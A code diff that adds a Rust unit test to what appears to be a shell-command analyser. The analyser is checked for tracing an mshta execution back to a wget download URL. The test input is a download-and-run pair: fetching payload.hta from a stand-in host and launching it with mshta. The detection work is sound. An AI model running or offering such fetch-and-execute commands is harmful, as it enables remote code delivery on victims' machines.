@@ -8194,6 +8194,28 @@ mod wget_tests {
     }
 
     #[test]
+    fn wget_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget --directory-prefix C:\Temp https://wget-prefix-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve wget directory-prefix download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wget_schemeless_domain_path_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
